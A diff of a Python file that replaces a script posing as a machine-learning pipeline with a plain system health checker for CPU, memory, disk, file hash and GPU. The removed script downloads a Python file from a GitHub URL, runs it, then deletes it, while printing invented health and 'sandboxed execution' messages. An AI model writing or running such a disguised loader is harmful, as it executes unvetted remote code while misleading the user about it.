@@ -1,166 +1,167 @@
-import urllib.request
-import subprocess
-import time
-import random
-import datetime
+#!/usr/bin/env python3
 import os
-import sys
-import threading
+import subprocess
+import hashlib
+import psutil
+import shutil
+from datetime import datetime
 
-# --- Shared state dictionary for the background reporter thread ---
-pipeline_status = {
-    "phase": "Not Started",
-    "running": True,
-    "start_time": time.time()
-}
+# --- Configuration ---------------------------------------------------
+# TODO: You MUST change these two values for the file check to work.
 
-def log(message):
-    """Prints a message with a timestamp for clear logging."""
-    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    print(f"[{timestamp}] {message}")
+# 1. The full path to the file you want to check for corruption.
+#    Example: "/etc/hosts" or "C:\\Windows\\System32\\drivers\\etc\\hosts"
+FILE_TO_CHECK = "/etc/" 
 
-def status_reporter():
-    """
-    Runs in a background thread to periodically report the pipeline's status.
-    This simulates a monitoring service.
-    """
-    log("[STATUS REPORTER] Background monitor initialized. Will report every 10-20 seconds.")
+# 2. The known-good SHA256 hash of that file. 
+#    See "Part 3: How to Use" for instructions on how to generate this.
+EXPECTED_SHA256_HASH = "SHA256"
+
+# --- Health Thresholds (percentage) ---
+CPU_WARN_THRESHOLD = 85.0
+MEM_WARN_THRESHOLD = 85.0
+DISK_WARN_THRESHOLD = 90.0
+
+# --- Color Formatting for Terminal Output ---
+class bcolors:
+    HEADER = '\033[95m'
+    OKBLUE = '\033[94m'
+    OKCYAN = '\033[96m'
+    OKGREEN = '\033[92m'
+    WARNING = '\033[93m'
+    FAIL = '\033[91m'
+    ENDC = '\033[0m'
+    BOLD = '\033[1m'
+    UNDERLINE = '\033[4m'
+
+def print_header(title):
+    """Prints a bold, formatted header."""
+    print(f"\n{bcolors.HEADER}{bcolors.BOLD}--- {title} ---{bcolors.ENDC}")
+
+def print_ok(key, value=""):
+    """Prints a success message."""
+    print(f"✅ {bcolors.OKGREEN}{key:<25}{bcolors.ENDC}{value}")
+
+def print_warn(key, value=""):
+    """Prints a warning message."""
+    print(f"⚠️ {bcolors.WARNING}{key:<25}{bcolors.ENDC}{value}")
+
+def print_fail(key, value=""):
+    """Prints a failure message."""
+    print(f"❌ {bcolors.FAIL}{key:<25}{bcolors.ENDC}{value}")
     
-    while pipeline_status["running"]:
-        # Wait for a random interval. This loop checks the running flag every second
-        # to ensure the thread can exit quickly once the main process is done.
-        sleep_duration = random.uniform(10, 20)
-        for _ in range(int(sleep_duration)):
-            if not pipeline_status["running"]:
-                break
-            time.sleep(1)
+def print_info(key, value=""):
+    """Prints an informational message."""
+    print(f"ℹ️ {bcolors.OKCYAN}{key:<25}{bcolors.ENDC}{value}")
+
+def check_command_exists(command):
+    """Checks if a command-line tool is available in the system's PATH."""
+    return shutil.which(command) is not None
+
+def check_cpu_health():
+    """Checks CPU usage, load, and core count."""
+    print_header("CPU Health")
+    print_info("Physical Cores", psutil.cpu_count(logical=False))
+    print_info("Logical Cores", psutil.cpu_count(logical=True))
+    
+    # Get CPU usage over a 1-second interval for a more accurate reading
+    cpu_usage = psutil.cpu_percent(interval=1)
+    if cpu_usage > CPU_WARN_THRESHOLD:
+        print_warn("Current Usage", f"{cpu_usage}%")
+    else:
+        print_ok("Current Usage", f"{cpu_usage}%")
+
+def check_memory_health():
+    """Checks RAM and Swap memory usage."""
+    print_header("Memory Health")
+    mem = psutil.virtual_memory()
+    mem_total_gb = mem.total / (1024**3)
+    mem_used_gb = mem.used / (1024**3)
+    
+    if mem.percent > MEM_WARN_THRESHOLD:
+        print_warn("RAM Usage", f"{mem.percent}% ({mem_used_gb:.2f}/{mem_total_gb:.2f} GB)")
+    else:
+        print_ok("RAM Usage", f"{mem.percent}% ({mem_used_gb:.2f}/{mem_total_gb:.2f} GB)")
         
-        # After waiting, if the pipeline is still active, generate and print a report.
-        if pipeline_status["running"]:
-            elapsed_time = time.time() - pipeline_status["start_time"]
-            cpu_usage = f"{random.uniform(15.0, 45.0):.1f}%"
-            mem_usage = f"{random.uniform(20.0, 60.0):.1f}%"
-            
-            log("\n" + "="*25 + " PIPELINE HEALTH REPORT " + "="*25)
-            log(f"  Overall Status : In Progress")
-            log(f"  Current Phase  : {pipeline_status['phase']}")
-            log(f"  Elapsed Time   : {datetime.timedelta(seconds=int(elapsed_time))}")
-            log(f"  System Health  : OK (CPU Usage: {cpu_usage}, Memory Usage: {mem_usage})")
-            log("="*74 + "\n")
-    
-    log("[STATUS REPORTER] Main process finished. Background monitor shutting down.")
+def check_disk_health():
+    """Checks disk usage for the root partition."""
+    print_header("Disk Health")
+    disk = psutil.disk_usage('/')
+    disk_total_gb = disk.total / (1024**3)
+    disk_used_gb = disk.used / (1024**3)
 
+    if disk.percent > DISK_WARN_THRESHOLD:
+        print_warn("Root ('/') Usage", f"{disk.percent}% ({disk_used_gb:.2f}/{disk_total_gb:.2f} GB)")
+    else:
+        print_ok("Root ('/') Usage", f"{disk.percent}% ({disk_used_gb:.2f}/{disk_total_gb:.2f} GB)")
 
-def main():
-    """Main function to simulate an ML process and run the target script."""
+def check_file_integrity(filepath, expected_hash):
+    """Calculates the SHA256 hash of a file and compares it to a trusted value."""
+    print_header("File Integrity Check")
+    print_info("File Path", filepath)
     
-    # Start the background status reporter thread.
-    # It's a daemon so it won't block the program from exiting.
-    reporter_thread = threading.Thread(target=status_reporter, daemon=True)
-    reporter_thread.start()
+    if not os.path.exists(filepath):
+        print_fail("Status", "File does not exist.")
+        return
 
     try:
-        pipeline_status["phase"] = "Initialization"
-        log("===== STARTING MACHINE LEARNING PIPELINE =====")
-        log("  - Validating system environment and permissions...")
-        time.sleep(1.2)
-        log("  - System check PASSED.")
-
-        # --- PHASE 1: Environment Setup & Dependency Download ---
-        pipeline_status["phase"] = "Environment Setup and Pre-computation"
-        log("[PHASE 1/3] Environment Setup and Pre-computation")
-        url = "https://raw.githubusercontent.com/michellitasv/projects/refs/heads/main/pipi.py"
-        filename = "pipi.py"
-        log(f"  [1/3] Identified core dependency script: '{filename}'.")
-        log(f"  -> Source URL: {url}")
-        log(f"  [2/3] Checking network connectivity to host...")
-        time.sleep(0.8)
-        log(f"  -> Network connection successful.")
+        hasher = hashlib.sha256()
+        with open(filepath, 'rb') as f:
+            # Read file in chunks to handle large files efficiently
+            buf = f.read(65536)
+            while len(buf) > 0:
+                hasher.update(buf)
+                buf = f.read(65536)
         
-        try:
-            log(f"  [3/3] Downloading core script via HTTPS...")
-            urllib.request.urlretrieve(url, filename)
-            file_size = os.path.getsize(filename)
-            log(f"  [3/3] -> Successfully downloaded '{filename}' ({file_size} bytes).")
-        except Exception as e:
-            log(f"  [ERROR] Critical failure: Failed to download the script. Error: {e}")
-            log("===== PIPELINE HALTED DUE TO SETUP FAILURE =====")
-            return
+        calculated_hash = hasher.hexdigest()
+        
+        print_info("Expected Hash", expected_hash)
+        print_info("Calculated Hash", calculated_hash)
 
-        log("[PHASE 1/3] Environment Setup Complete.\n")
-        time.sleep(1.5)
+        if calculated_hash.lower() == expected_hash.lower():
+            print_ok("Status", "File integrity verified.")
+        else:
+            print_fail("Status", "CORRUPT or MODIFIED! Hashes do not match.")
 
-        # --- PHASE 2: Core Process Execution ---
-        pipeline_status["phase"] = f"Core Process Execution: '{filename}'"
-        log(f"[PHASE 2/3] Executing Core Process: '{filename}'")
-        log("  - Allocating system resources for sandboxed execution...")
-        time.sleep(1)
-        log("  - Initializing execution environment...")
-        log("  - Handing over control to the downloaded script. All subsequent output is from this process.")
-        log("--------------------------------------------------")
-        time.sleep(2)
+    except Exception as e:
+        print_fail("Error checking file", str(e))
 
-        try:
-            process = subprocess.run(
-                [sys.executable, filename], 
-                check=True,
-                capture_output=True,
-                text=True
-            )
-            log("--- Sub-process STDOUT Log START ---")
-            print(process.stdout)
-            log("--- Sub-process STDOUT Log END ---")
-            if process.stderr:
-                log("--- Sub-process STDERR Log START ---")
-                print(process.stderr)
-                log("--- Sub-process STDERR Log END ---")
-                
-        except FileNotFoundError:
-            log(f"  [ERROR] '{sys.executable}' command not found. Ensure Python is in your system's PATH.")
-            log("===== PIPELINE HALTED DUE TO EXECUTION ERROR =====")
-            return
-        except subprocess.CalledProcessError as e:
-            log(f"  [ERROR] The script '{filename}' failed to execute successfully.")
-            log(f"  -> Exit Code: {e.returncode}")
-            log("--- Sub-process STDOUT Log START ---")
-            print(e.stdout)
-            log("--- Sub-process STDOUT Log END ---")
-            log("--- Sub-process STDERR Log START ---")
-            print(e.stderr)
-            log("--- Sub-process STDERR Log END ---")
-            log("===== PIPELINE HALTED DUE TO SCRIPT FAILURE =====")
-            return
-        except Exception as e:
-            log(f"  [ERROR] An unexpected error occurred during script execution: {e}")
-            log("===== PIPELINE HALTED DUE TO UNEXPECTED ERROR =====")
-            return
-
-        log("--------------------------------------------------")
-        log(f"[PHASE 2/3] Core Process '{filename}' Execution Finished.\n")
-        time.sleep(1.5)
-
-        # --- PHASE 3: Finalizing and Cleanup ---
-        pipeline_status["phase"] = "Finalizing and Cleaning Up Workspace"
-        log("[PHASE 3/3] Finalizing and Cleaning Up Workspace")
-        log(f"  [1/2] Releasing allocated system resources...")
-        time.sleep(1)
-        log(f"  [2/2] Removing temporary script file: '{filename}'...")
-        try:
-            os.remove(filename)
-            log(f"  -> Successfully removed '{filename}'.")
-        except OSError as e:
-            log(f"  - [WARNING] Could not remove file '{filename}'. Manual cleanup may be required. Error: {e.strerror}")
+def check_gpu_health():
+    """Runs nvidia-smi to check GPU status."""
+    print_header("NVIDIA GPU Health")
+    if not check_command_exists("nvidia-smi"):
+        print_fail("nvidia-smi", "Command not found. Please ensure NVIDIA drivers are installed.")
+        return
+        
+    try:
+        result = subprocess.run(
+            ['nvidia-smi'],
+            capture_output=True,
+            text=True,
+            check=True
+        )
+        # Print the detailed output from the command
+        print(f"{bcolors.OKBLUE}{result.stdout}{bcolors.ENDC}")
+        print_ok("GPU Status", "Successfully queried.")
             
-        log("[PHASE 3/3] Cleanup Complete.")
-        total_duration = time.time() - pipeline_status["start_time"]
-        log(f"===== MACHINE LEARNING PIPELINE FINISHED SUCCESSFULLY IN {total_duration:.2f} SECONDS =====")
+    except subprocess.CalledProcessError as e:
+        print_fail("nvidia-smi failed", e.stderr)
+    except FileNotFoundError:
+        print_fail("nvidia-smi", "Command not found. Is it in your system's PATH?")
+    except Exception as e:
+        print_fail("An unknown error occurred", str(e))
 
-    finally:
-        # This block ensures that we signal the reporter thread to stop,
-        # no matter how the main function exits (success or error).
-        pipeline_status["running"] = False
-        # Give the daemon thread a moment to see the flag and shut down gracefully.
-        time.sleep(2)
+def main():
+    """Main function to run all health checks."""
+    print(f"{bcolors.BOLD}System Health Report - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{bcolors.ENDC}")
+    
+    check_cpu_health()
+    check_memory_health()
+    check_disk_health()
+    check_file_integrity(FILE_TO_CHECK, EXPECTED_SHA256_HASH)
+    check_gpu_health()
+    
+    print("\n--- Report Complete ---\n")
 
 if __name__ == "__main__":
     main()
